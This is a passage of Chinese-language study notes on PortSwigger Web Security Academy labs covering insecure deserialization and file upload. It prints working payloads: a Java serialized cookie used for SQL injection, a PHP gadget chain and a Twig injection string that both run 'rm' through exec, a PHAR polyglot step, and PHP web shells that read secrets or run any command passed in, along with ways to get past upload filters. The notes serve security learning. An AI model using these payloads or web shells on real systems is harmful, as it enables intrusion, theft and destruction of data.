namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">SQLException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Statement</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductTemplate</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> serialVersionUID <span class="token operator">=</span> <span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> id<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token class-name">Product</span> product<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> inputStream<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span>    <span class="token punctuation">&#123;</span>        inputStream<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">JdbcConnectionBuilder</span> connectionBuilder <span class="token operator">=</span> <span class="token class-name">JdbcConnectionBuilder</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>                <span class="token string">"org.postgresql.Driver"</span><span class="token punctuation">,</span>                <span class="token string">"postgresql"</span><span class="token punctuation">,</span>                <span class="token string">"localhost"</span><span class="token punctuation">,</span>                <span class="token number">5432</span><span class="token punctuation">,</span>                <span class="token string">"postgres"</span><span class="token punctuation">,</span>                <span class="token string">"postgres"</span><span class="token punctuation">,</span>                <span class="token string">"password"</span>        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">withAutoCommit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span>        <span class="token punctuation">&#123;</span>            <span class="token class-name">Connection</span> connect <span class="token operator">=</span> connectionBuilder<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM products WHERE id = '%s' LIMIT 1"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Statement</span> statement <span class="token operator">=</span> connect<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            product <span class="token operator">=</span> <span class="token class-name">Product</span><span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> id<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Product</span> <span class="token function">getProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> product<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 这种直接将用户提供的值插入SQL查询语句中的方式存在安全风险，容易受到SQL注入攻击</span></code></pre></li><li><p>instantiate a <code>ProductTemplate</code></p><p><ahref="https://github.com/PortSwigger/serialization-examples/tree/master/java/solution">工具</a></p><p>将 <code>id</code>替换成payload</p><pre class="language-java" data-language="java"><code class="language-java"># main<span class="token punctuation">.</span>java<span class="token keyword">import</span> <span class="token import"><span class="token namespace">data<span class="token punctuation">.</span>productcatalog<span class="token punctuation">.</span></span><span class="token class-name">ProductTemplate</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ProductTemplate</span> originalObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ProductTemplate</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> serializedObject <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>originalObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Serialized object: "</span> <span class="token operator">+</span> serializedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ProductTemplate</span> deserializedObject <span class="token operator">=</span> <span class="token function">deserialize</span><span class="token punctuation">(</span>serializedObject<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialized object ID: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Serializable</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> base64SerializedObj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>base64SerializedObj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>            <span class="token class-name">T</span> obj <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> obj<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>运行结果，将序列化对象粘贴到burp的Cookie中<imgsrc="https://s2.loli.net/2023/07/07/X7ZANd6wseGifKL.png"alt="image-20230707234617460" /></p><ol type="1"><li>使用Sql通用爆破手法：库-表-列。获取管理员密码。<imgsrc="https://s2.loli.net/2023/07/07/m9sgJAR46dEMiaw.png"alt="image-20230707234916693" /></li></ol></li></ol><h5id="lab-developing-a-custom-gadget-chain-for-php-deserialization-1">Lab:Developing a custom gadget chain for PHP deserialization</h5><ol type="1"><li><p>Cookie中包含反序列化对象</p></li><li><p>加上<strong>~</strong>获得源文件备份,<strong>原理</strong>：当一个文件被创建或修改时，服务器通常会自动创建一个带有<code>~</code>后缀的备份文件。<imgsrc="https://s2.loli.net/2023/07/08/v4ol7LATyHdxBNF.png"alt="image-20230708043558591" /></p><p>获得源代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$default_desc_type</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$product</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$desc_type</span><span class="token operator">=</span><span class="token string single-quoted-string">'HTML_DESC'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Description</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default_desc_type</span> <span class="token operator">=</span> <span class="token variable">$desc_type</span><span class="token punctuation">;</span>        <span class="token comment">// Carlos thought this is cool, having a function called in two places... What a genius</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"default_desc_type"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"desc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">build_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">product</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Product</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">default_desc_type</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Product</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$default_desc_type</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token variable">$desc</span><span class="token operator">-></span><span class="token variable">$default_desc_type</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Description</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$HTML_DESC</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$TEXT_DESC</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// @Carlos, what were you thinking with these descriptions? Please refactor!</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">HTML_DESC</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;p>This product is &lt;blink>SUPER&lt;/blink> cool in html&lt;/p>'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token constant">TEXT_DESC</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'This product is cool in text'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">DefaultMap</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span> <span class="token operator">=</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">callback</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>源代码解析：以上代码中存在一个漏洞，可以通过构造特定的CustomTemplate对象来触发代码执行。</p><ol type="1"><li><p>CustomTemplate类的<code>__wakeup()</code>方法：在<code>__wakeup()</code>方法中，会调用<code>build_product()</code>方法重新构建<code>$product</code>对象。这意味着在反序列化时，会执行<code>build_product()</code>方法中的代码。</p></li><li><p>Product类的构造函数<code>__construct()</code>：在构造函数中，根据传入的<code>$default_desc_type</code>参数从<code>$desc</code>对象中获取相应的描述内容，并将其赋值给<code>$desc</code>属性。</p></li><li><p>DefaultMap类的<code>__get()</code>方法：在<code>__get()</code>方法中，当尝试读取不存在的属性时，会通过<code>call_user_func()</code>函数调用<code>$callback</code>函数，并传递参数<code>$name</code>。</p></li></ol><p>由于以上<strong>三个类之间的关系</strong>，可以构造以下恶意的CustomTemplate对象来触发代码执行：</p><ul><li>将CustomTemplate的<code>$default_desc_type</code>属性设置为恶意的命令字符串，如<code>"rm /home/carlos/morale.txt"</code>。</li><li>将CustomTemplate的<code>$desc</code>属性设置为一个DefaultMap对象。</li><li>将DefaultMap的<code>$callback</code>属性设置为<code>"exec"</code>，表示要执行的回调函数是<code>exec()</code>函数。</li></ul><p>当这个恶意的CustomTemplate对象被反序列化时，会执行<code>__wakeup()</code>方法中的<code>build_product()</code>方法。在<code>build_product()</code>方法中，</p><p>接下来，当尝试读取DefaultMap对象的<code>$desc</code>属性时，由于该属性不存在，会触发DefaultMap的<code>__get()</code>方法。在<code>__get()</code>方法中，通过<code>call_user_func()</code>函数调用<code>$callback</code>函数（即<code>exec()</code>函数），并将命令字符串作为参数传递给它。这样就实现了对恶意命令的执行。</p></li><li><p>构造特定的CustomTemplate对象</p><pre class="language-json" data-language="json"><code class="language-json">O<span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span><span class="token property">"CustomTemplate"</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span><span class="token string">"default_desc_type"</span>;s<span class="token operator">:</span><span class="token number">26</span><span class="token operator">:</span><span class="token string">"rm /home/carlos/morale.txt"</span>;s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"desc"</span>;O<span class="token operator">:</span><span class="token number">10</span><span class="token operator">:</span><span class="token property">"DefaultMap"</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>s<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"callback"</span>;s<span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"exec"</span>;<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h6id="lab-using-phar-deserialization-to-deploy-a-custom-gadget-chain-1">Lab:Using PHAR deserialization to deploy a custom gadget chain</h6><ul><li>phar隐式反序列化，fil_exist函数触发</li><li>总的来说：这个lab有很多不理解的地方</li></ul><ol type="1"><li><p>查看两个类文件<imgsrc="https://s2.loli.net/2023/07/10/LMJHyNSfQxAF3q6.png"alt="image-20230710011221244" /></p></li><li><p>源码分析</p><ol type="1"><li><p>Blog.php,解析请看注释</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/usr/local/envs/php-twig-1.19/vendor/autoload.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$user</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$twig</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$desc</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token variable">$desc</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     <span class="token comment">// server-side template injection漏洞</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$loader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Loader_Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'index'</span> <span class="token operator">=></span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">desc</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token variable">$loader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"user"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"desc"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>   <span class="token delimiter important">?></span></span></code></pre><p>解析：</p><ol type="1"><li><p>Study the source code and identify the gadget chain involving the<code>Blog-&gt;desc</code> and<code>CustomTemplate-&gt;lockFilePath</code> attributes</p></li><li><p>服务端模板注入payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>_self<span class="token operator">.</span>env<span class="token operator">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rm /home/carlos/morale.txt"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><strong>问题</strong>：不理解file_exist函数是怎么执行的，难道没有执行，也能触发phar反序列化</p></li></ol></li></ol></li><li><p>写一个php文件：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">CustomTemplate</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Blog</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token variable">$object</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CustomTemplate</span><span class="token punctuation">;</span><span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blog</span><span class="token punctuation">;</span><span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">desc</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("rm /home/carlos/morale.txt")&#125;&#125;'</span><span class="token punctuation">;</span><span class="token variable">$blog</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span><span class="token variable">$object</span><span class="token operator">-></span><span class="token property">template_file_path</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span></code></pre><p>解析：</p><ol type="1"><li><strong>问题：</strong>不理解这里为什么要写两个空类，这两个在各自的类文件不是已经定义了吗</li></ol></li><li><p>构造PHAR-JPG</p><p>search for "<code>phar jpg polyglot</code></p><p>上传这个jpg</p></li><li><p>修改请求<imgsrc="https://s2.loli.net/2023/07/10/zi3GdNwjK5TY6hX.png"alt="image-20230710013410200" /></p></li></ol><hr /><p>2023-07-11补充：<ahref="https://zhuanlan.zhihu.com/p/143941564">一篇不错的phar反序列化示例</a></p><h3 id="file-upload-vulnerabilities">File upload vulnerabilities</h3><h4 id="lab-remote-code-execution-via-web-shell-upload">Lab: Remote codeexecution via web shell upload</h4><ol type="1"><li><p>登录wiener账号，上传php文件</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/home/carlos/secret'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></li><li><p>site map发现<imgsrc="https://s2.loli.net/2023/08/13/Ar8GxQJTj3wP1nt.png"alt="image-20230813051540554" /></p></li><li><p>repeater<imgsrc="https://s2.loli.net/2023/08/13/bke3OqKc8U4LlDV.png"alt="image-20230813051556375" /></p></li></ol><h4 id="a-more-versatile-web-shell">A more versatile web shell</h4><ol type="1"><li><p>like this:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'command'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><ol type="1"><li><p>request</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>example<span class="token path-separator">/</span>exploit.php</span><span class="token query"><span class="token query-delimiter">?</span><span class="token pair"><span class="token key">command</span>=<span class="token value">id</span></span></span></span> <span class="token http-version property">HTTP/1.1</span></span></code></pre></li></ol></li></ol><h4 id="lab-web-shell-upload-via-content-type-restriction-bypass">Lab:Web shell upload via Content-Type restriction bypass</h4><ol type="1"><li><p>如果上传php文件，<code>403</code><imgsrc="https://s2.loli.net/2023/08/13/KjGS4vhprcE1Ozu.png"alt="image-20230813054724046" /></p></li><li><p>改动<code>Content-type</code><imgsrc="https://s2.loli.net/2023/08/13/Dki1Tm7IA3Z4cFV.png"alt="image-20230813054822683" /></p></li><li><p>请求web shell<imgsrc="https://s2.loli.net/2023/08/13/VfLmk7stJ3vl9Hh.png" /></p></li></ol><h4 id="lab-web-shell-upload-via-path-traversal">Lab: Web shell uploadvia path traversal</h4><ol type="1"><li>上传web 